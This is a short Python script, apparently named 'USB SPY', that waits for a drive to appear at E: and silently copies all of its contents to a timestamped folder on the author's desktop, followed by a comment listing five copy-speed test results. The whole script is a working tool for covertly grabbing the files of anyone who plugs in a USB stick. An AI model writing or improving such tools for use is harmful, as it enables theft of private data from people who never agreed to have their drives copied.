from utils import *

import os
import time
import shutil
import time


START = time.time()


YEAR = get_year()
MONTH = get_month()
HOUR = get_hour()
MINUTES = get_minute()
SECONDS = get_seconds()

TARGET = "E:"

DESTINATION = f"C:/Users/Nave/Desktop/USB SPY/Output/{YEAR}-{MONTH}-{HOUR}-{MINUTES}-{SECONDS}"


while True:
    if (os.path.exists(TARGET)):
        files = os.listdir(TARGET)
        shutil.copytree(TARGET, DESTINATION)
        break
    print("Not yet...")
    time.sleep(2)
    

print("--- %s seconds ---" % (time.time() - START))
'''
RESULTS:

test 1: 553.80 seconds : 17.876 MB/s
test 2: 556.45 seconds : 17.79 MB/s
test 3: 554.61 seconds : 17.85 MB/s
test 4: 520.50 seconds : 19.02 MB/s
test 5: 493.29 seconds : 20.07 MB/s
'''